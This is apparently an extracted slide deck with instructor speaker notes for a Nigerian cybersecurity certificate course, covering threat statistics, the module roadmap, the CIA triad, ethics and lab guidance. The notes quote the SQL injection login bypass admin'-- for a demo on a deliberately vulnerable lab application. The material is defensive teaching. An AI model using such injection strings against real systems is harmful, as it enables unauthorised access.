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red cursor sets the tone — this is a technical, intense course. Use the opening ATM story before showing this slide.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statistics ground the course in reality. Students need to understand they're entering a profession with genuine demand and genuine stakes.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 the full roadmap. The lab platforms are a differentiator — name them all. Students should feel they're getting access to the same tools as professionals.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map shows students the full arc of the course. By the end of the Beginner level, they can think like a defender. By Intermediate, they can think like an attacker. Advanced adds real-world attack and malware analysis. Professional prepares them for enterprise roles with governance and forensics responsibilities.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ATM story before this slide. The story sets the tone: social engineering is the most common attack vector. Technology is not always the attacker's tool.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tension is the teaching moment. Ask students to identify where they'd place a hospital's patient records system on the triad. Then a military communications system. Then a public news website. Same principles, different balance points.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reference map. Every tool you teach in this course lives in one of these three columns. When students ask 'why are we learning X?' — point them here. SHA-256? Integrity. TLS? Confidentiality. Cloudflare? Availability. Return to this slide at the end of Module 1 and again at the end of the course.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SilverTerrier reference is important. Nigeria is mentioned in international threat intelligence as the origin of sophisticated BEC operations. Acknowledging this honestly is part of building a counterforce.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cannot be rushed. State clearly: every technique taught in this course requires authorisation before use. The legal consequences are real and have been applied in Nigeria.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real market rates. The OSCP certification (Offensive Security Certified Professional) is the most respected penetration testing certification globally. It's difficult — a 24-hour practical exam. Worth pursuing after this programme.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Networking is not optional background. It is the foundation of understanding every attack. If a student says "I don't need to know networking," the response is: "Tell me how to defend a network you don't understand."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last three lines are the key insight. Traditional corporate security focuses on network-layer firewalls. Modern attackers live at the application layer. This mismatch is why breaches happen through "secured" networks.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those concepts where the diagram immediately makes sense. Draw the SYN flood on the board — show the server drowning in half-open connections.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students pull out their phones and check if they're using any HTTP websites for sensitive activities (banking, email). Look at the lock icon. No lock = no protection.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who have never used a command line often feel anxious. Reassure them: Linux commands are logical and consistent. Within 2 sessions they'll feel fluent in the basics.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Print this as a reference card. Students should have it in front of them during every Linux lab. After 10 hours of practice, they won't need it — it will be instinct.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777 rule is non-negotiable. Any file or directory with 777 permissions should be investigated — it means anyone on the system can modify it. This is a common misconfiguration left by developers.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Cryptography intimidates students. Start by telling them: you don't need to understand the math. You need to understand what it does, when to use it, and what breaks it. The math is the computer's job.</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hybrid approach is the key insight. No real-world system uses only asymmetric encryption for data — it's too slow. They use it to establish a shared key, then switch to AES.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"slow by design" point for bcrypt is crucial. bcrypt is intentionally slow to compute — 100ms instead of microseconds. For a legitimate user, unnoticeable. For an attacker trying millions of passwords — makes brute force take millennia.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magic is step 4. Both sides derive the same key without ever sending it over the network. This is Diffie-Hellman key exchange. Anyone watching sees the exchange but cannot determine the shared secret from what they observed.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"not just a firewall" message is important for students who come in thinking firewalls = security. The lesson: firewalls are layer 3/4 controls. Most attacks now happen at layer 7 (application). You need multiple layers.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DMZ concept is what most students haven't seen before. Draw this three-zone model on the board. "If the web server gets hacked — and it probably will eventually — the attacker is still in the DMZ, not in your database."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creates the most silence in the room. Students realise that "securing" their systems while leaving them exposed on Shodan is not security at all. Run a Shodan search live if possible — show real (not staged) results.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tone immediately: this is professional work, not "hacking for fun." Penetration testing is billable, structured, documented, and legally protected — but ONLY with written authorisation.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Spend time on Phase 1. Students want to jump to Phase 5 (exploitation). Force them to understand: a penetration test without proper documentation and authorisation is simply a cyberattack. The paper is what makes it legal.</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80% statistic gets attention. Most students think attacks happen at the network level. Most attacks happen at the application level — in code that developers wrote.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A01 being #1 (Broken Access Control) is the key insight — it moved up from #5. Access control failures are everywhere, in every application. Students will test for this first in every web application assessment.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demo here. Open WebGoat or DVWA and actually exploit it. Let students see the admin dashboard appear after typing `admin'--`. The visual impact of breaking a real (lab) application is unforgettable.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"Who installed Log4j? The answer is: developers, by adding one line to a build file. You are responsible for the security of every line of code your application runs — including the code you didn't write. SCA tools are now a mandatory part of any professional development pipeline."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slide, tell students: "I'm going to teach you how attackers manipulate people. This is so you can recognise it, defend against it, and train others to defend against it. NOT so you can use it."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students to identify which principles are used in the ATM scam from Module 1. (Authority: bank uniform. Urgency: machine is "having an issue." Liking: friendly demeanour.) All three in one 2-minute interaction.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student should do this after class: call their telecom and ask for a SIM lock. This is a 5-minute action that significantly raises the bar for SIM swap attacks.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Safety briefing before ANY lab: "We NEVER execute malware samples on our primary machines. Isolated VM, snapshot before, revert after. This is non-negotiable."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WhatsApp delivery vector for RATs is specifically Nigerian context. Many students have received "bank update APK" files or similar on WhatsApp. These are RATs. Never install APKs from WhatsApp.</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ANY.RUN shows malware behaviour, have students map each observed behaviour to an ATT&amp;CK technique. This bridges dynamic analysis to threat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module is where the emotional tone of the course shifts. Students have been learning offensive techniques. Now they learn what it feels like to be the defender when something is actively happening. The tabletop exercise is the centrepiece.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197-day statistic should be met with disbelief. Explain: organisations aren't blind — they're overwhelmed. Alert fatigue. Too many events, too few analysts to investigate. SIEM tuning and proper triage is what closes this gap.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"don't turn off" rule for incident response surprises students. Explain: RAM contains running processes, network connections, encryption keys, and evidence that vanishes the moment power is cut. Memory forensics may be the only way to recover ransomware decryption keys.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Cloud is where most new Nigerian tech infrastructure lives. AWS Lagos region (af-south-1) opened in 2021 — Nigerian organisations have a nearby option. Understanding cloud security is increasingly a mandatory skill for any security professional.</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Show the actual AWS shared responsibility model diagram (available on aws.amazon.com). The concept of responsibility "shifting" based on service type (IaaS vs PaaS vs SaaS) is important for advanced students.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Nigerian case study brings this home. Ask: "How many of you have heard of a company's data being 'hacked' in Nigeria?" Most hands go up. "Almost none of those were infrastructure hacks. Almost all were misconfigurations." Cloud security is largely about doing the basics right.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module reframes everything. Technical skills enable security. Business skills make security effective. Students who can translate security into business language — risk, cost, regulation — will rise to leadership.</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CBN 24-hour incident reporting requirement catches students off guard. "For banks, you have 24 hours to report to CBN — which is faster than the NDPA 72-hour requirement to the NDPC. If you work in banking, CBN reporting takes priority."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this translation skill. Take a technical finding and restate it in business terms. Students should do this for every major finding in their capstone reports.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Zero Trust is not a vendor product you can buy. Every major security vendor has a "Zero Trust platform" they want to sell you. The reality: it's an architectural philosophy that requires changes across identity, network, application, and data layers.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Nigeria is particularly vulnerable to AI-generated deepfake attacks because of the prevalence of voice-call-based fraud (vishing). AI can clone a CEO's voice from 5 seconds of audio. This is not hypothetical — it has happened to companies globally.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Guide students to their path based on career goal. Want SOC analyst? Option B is perfect practice. Want to be a penetration tester? Option A. Career changer from training/HR? Option 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studies are the most practical section. They test whether students can apply knowledge, not just recall it. The Nigerian bank breach case will require students to reference NDPA 2023 requirements — reinforcing the legal context throughout.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prospective student info sessions. The blockchain verification angle is genuinely unique — position it as the key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soft skills round is where many technical students fail. Practice explaining security concepts in plain language. The Feynman technique: if you can't explain it simply, you don't understand it well enough.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Kali Linux is the key. Download it. Install it in VirtualBox. This is your professional environment. Every security professional has Kali available somewhere. Getting comfortable with it takes practice — start day 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Portfolio over CV. Employers want proof, not promises. A GitHub with 5 well-documented security lab write-ups demonstrates more than a CV listing "knowledge of cybersecurity."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this slide breathe. Pause after it. This is the motivational close. Students should feel the weight and privilege of what they're entering. The emotional close matters as much as the technical content.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mentoring point is important. The Nigerian security community is small. Everyone knows everyone. Being known as someone who helps others grow accelerates your own career more than almost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every session with this. The WhatsApp link is the call to action. For existing students: ask them to share this with anyone who asks about getting into cybersecurity.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"Stay dangerous" — dangerous to attackers, through skill and knowledge. Leave students with this three-part code: curious (never stop learning), ethical (authorisation first), dangerous (competent enough to make a difference).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4572000" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1300" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MetaBridge Academy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1828800"/>
            <a:ext cx="10360152" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="4000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CYBERSECURITY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="3108960"/>
            <a:ext cx="10360152" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="2200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SLIDE DECK</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="3840480"/>
            <a:ext cx="10360152" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Nigeria's Premier Blockchain &amp; Technology Academy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>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TITLE SLIDE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METABRIDGE ACADEMY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CYBERSECURITY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Professional Certificate Programme</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Think Like an Attacker. Defend Like a Professional.</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a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>12 Modules · Kali Linux · TryHackMe · Burp Suite · Wireshark</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Blockchain-Verified Certificate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>metabridgeacademy.com</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THE NIGERIAN CYBER THREAT REALITY</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NIGERIA'S CYBERSECURITY REALITY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>$500M+       Annual losses to cybercrime (EFCC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>37,000+      Banking fraud cases per year (NIBSS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>44%          Increase in BEC fraud targeting Nigerian businesses (2023)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>197 days     Average time to detect a breach globally (IBM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WHAT NIGERIANS FACE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ SIM swap fraud — a growing epidemic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Smishing (fake bank SMS) — millions sent daily</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ BEC fraud — Nigerian groups operate globally</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Ransomware — targeting hospitals, schools, businesses</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>YOU ARE THE SOLUTION.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MetaBridge-trained cybersecurity professionals.</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COURSE OVERVIEW</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YOUR 12-MODULE SECURITY JOURNEY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>FOUNDATION (Modules 1–4)          TECHNICAL SKILLS (Modules 5–7)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1. Introduction &amp; CIA Triad        5. Network Security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2. Networking for Security         6. Ethical Hacking &amp; Pentest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3. Linux &amp; Command Line            7. Web App Security (OWASP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>4. Cryptography &amp; PKI</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>HUMAN &amp; MALWARE (Modules 8–9)     ADVANCED (Modules 10–12)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>8. Social Engineering              10. Incident Response &amp; Forensics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>9. Malware Analysis                11. Cloud Security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>12. GRC &amp; Future of Security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>+ CAPSTONE PROJECT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Lab Platforms: ANY.RUN · VirusTotal · Wireshark · Nmap ·</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Burp Suite · Shodan · TryHackMe · Metasploit ·</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>OWASP ZAP · Kali Linux · Have I Been Pwned · CyberChef</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DIFFICULTY LEVEL OVERVIEW</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YOUR LEARNING JOURNEY — 4 LEVELS OF MASTERY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>BEGINNER        M1–M3    Cybersecurity foundations · Networking for security · Linux &amp; command line</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>INTERMEDIATE    M4–M6    Cryptography &amp; PKI · Network security · Ethical hacking methodology</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ADVANCED        M7–M9    Web app security (OWASP) · Social engineering · Malware analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>PROFESSIONAL   M10–M12   Incident response &amp; forensics · Cloud security · GRC &amp; compliance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Complete each level before advancing to the next.</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BEGINNER</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1 OPENER: INTRODUCTION TO CYBERSECURITY</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THE CIA TRIAD</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THE CIA TRIAD — THE FOUNDATION OF ALL SECURITY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CONFIDENTIALITY               INTEGRITY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"Only authorised people       "Information is accurate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>can access this"              and hasn't been tampered with"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Example:                      Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Encrypted customer data       SHA-256 hash verification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Role-based access control     Digital signatures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AVAILABILITY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"Systems are accessible</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>when legitimate users need them"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Server redundancy, DDoS protection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>THE CONSTANT TENSION:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Maximum confidentiality ↔ Maximum availability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Your job: find the right balance for the risk context</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CIA TRIAD: CONTROLS &amp; TOOLS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HOW WE PROTECT EACH PILLAR</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CONFIDENTIALITY    │      INTEGRITY       │    AVAILABILITY     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  ─────────────────  │  ──────────────────  │  ─────────────────  │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                     │                      │                     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
